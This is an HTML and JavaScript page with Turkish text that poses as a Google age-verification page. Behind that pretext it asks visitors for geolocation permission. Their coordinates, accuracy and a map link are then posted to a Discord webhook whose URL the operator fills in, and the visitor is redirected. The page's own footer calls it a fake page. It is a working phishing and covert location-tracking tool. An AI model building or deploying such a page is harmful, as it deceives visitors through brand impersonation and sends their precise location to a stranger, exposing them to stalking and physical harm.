        /* Konum MesajÄ± */

        /* Alt Bilgi (DMCA ve Politikalar) */

<body>

    <!-- Arka Plan -->
    <div class="background-overlay"></div>
    <div class="background-image"></div>

    <!-- Ãœst Bilgi (SaÄŸ Ãœst Bildirim) -->
    <div class="top-bar">
        <div class="notification-box" id="notificationBox">
            <p id="notificationText">Konum izni isteniyor...</p>
        </div>
    </div>

    <!-- Ä°Ã§erik AlanÄ± -->
    <div class="container">
        <div class="content">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
            <h1 class="title">YaÅŸÄ±nÄ±zÄ± DoÄŸrulayÄ±n</h1>
            <p class="description">Devam etmek iÃ§in lÃ¼tfen yaÅŸÄ±nÄ±zÄ± doÄŸrulayÄ±n. Bu, hizmetlerimizin gÃ¼venliÄŸini saÄŸlamaya yardÄ±mcÄ± olur.</p>
            <button class="button" onclick="requestLocation()">Konum Ä°znini Ver</button>
            <p class="location-message" id="locationMessage">Konum alÄ±nÄ±yor...</p>

            <!-- Alt Bilgi (Fake) -->
            <div class="footer">
                <p>Â© 2024 Google - Sahte bir sayfa</p>
                <div class="footer-links">
                    <a href="#" class="footer-link">Yeni Kural</a>
                    <a href="#" class="footer-link">Gizlilik</a>
                    <a href="#" class="footer-link">GÃ¼venlik PolitikasÄ±</a>
                    <a href="#" class="footer-link">DMCA</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        // WEBHOOK URL'NÄ°ZÄ° BURAYA YAZIN (Discord iÃ§in)
        const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // Ã–RNEK
        const locationMessage = document.getElementById('locationMessage');
        const notificationBox = document.getElementById('notificationBox');
        const notificationText = document.getElementById('notificationText');

        function requestLocation() {
            // Bildirim kutusunu gÃ¶ster
            showNotification("Konum izni isteniyor...");

            if ("geolocation" in navigator) {
                locationMessage.classList.add('show');
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                        // Konum bilgisini Discord'a gÃ¶nder
                        await sendToDiscord({
                            content: `ðŸ“ **Konum Bilgisi (YaÅŸ DoÄŸrulama):**`,
                            embeds: [{
                                title: "Konum Bilgisi",
                                color: 5814783,
                                fields: [
                                    { name: "Enlem (Latitude)", value: `\`${latitude}\``, inline: true },
                                    { name: "Boylam (Longitude)", value: `\`${longitude}\``, inline: true },
                                    { name: "DoÄŸruluk", value: `\`~${accuracy.toFixed(0)} metre\``, inline: true },
                                    { name: "Harita Linki", value: `[Google Maps](${mapsUrl})`, inline: false }
                                ],
                                timestamp: new Date().toISOString()
                            }]
                        });
                        locationMessage.textContent = "Konum baÅŸarÄ±yla alÄ±ndÄ±! YÃ¶nlendiriliyorsunuz...";
                        showNotification("Konum baÅŸarÄ±yla alÄ±ndÄ±! YÃ¶nlendiriliyorsunuz...", 3000); // 3 saniye sonra kapat
                        setTimeout(() => {
                            window.location.href = "https://www.ornekwebsiteniz.com";
                            locationMessage.classList.remove('show');
                            locationMessage.textContent = "Konum alÄ±nÄ±yor...";
                        }, 3000);
                    },
                    (error) => {
                        let errorMessage = "Konum alÄ±namadÄ±.";
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Konum izni reddedildi. LÃ¼tfen tekrar deneyin.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Konum bilgisi mevcut deÄŸil.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Konum isteÄŸi zaman aÅŸÄ±mÄ±na uÄŸradÄ±.";
                                break;
                        }
                        locationMessage.textContent = errorMessage;
                        showNotification(errorMessage, 5000); // 5 saniye sonra kapat
                        setTimeout(() => {
                           locationMessage.classList.remove('show');
                           locationMessage.textContent = "Konum alÄ±nÄ±yor...";
                        }, 5000);
                    }
                );
            } else {
                locationMessage.textContent = "TarayÄ±cÄ±nÄ±z konum Ã¶zelliÄŸini desteklemiyor.";
                showNotification("TarayÄ±cÄ±nÄ±z konum Ã¶zelliÄŸini desteklemiyor.", 5000); // 5 saniye sonra kapat
                setTimeout(() => {
                    locationMessage.classList.remove('show');
                    locationMessage.textContent = "Konum alÄ±nÄ±yor...";
                }, 5000);
            }
        }

        // Bildirim GÃ¶ster Fonksiyonu
        function showNotification(message, duration = null) {
            notificationText.textContent = message;
            notificationBox.classList.add('show');
            if (duration) {
                setTimeout(() => {
                    notificationBox.classList.remove('show');
                }, duration);
            }
        }

        // Discord'a GÃ¶nderme Fonksiyonu
        async function sendToDiscord(payload) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (!response.ok) {
                    throw new Error(`Webhook gÃ¶nderilemedi: ${response.status} ${response.statusText}`);
                }
                console.log("Discord'a log baÅŸarÄ±yla gÃ¶nderildi.");
            } catch (discordError) {
                console.error("Discord'a log gÃ¶nderilirken hata:", discordError);
            }
        }
    </script>
</body>
